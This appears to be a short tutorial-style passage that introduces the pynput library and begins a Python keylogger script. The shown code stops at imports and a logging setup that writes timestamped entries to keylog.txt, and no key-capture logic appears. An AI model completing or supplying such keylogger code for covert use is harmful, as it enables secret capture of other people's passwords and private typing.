The `pynput` library allows easy keyboard and mouse monitoring. A basic Python keylogger script might look like this:  
```python  
from pynput import keyboard  
import logging  

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')  

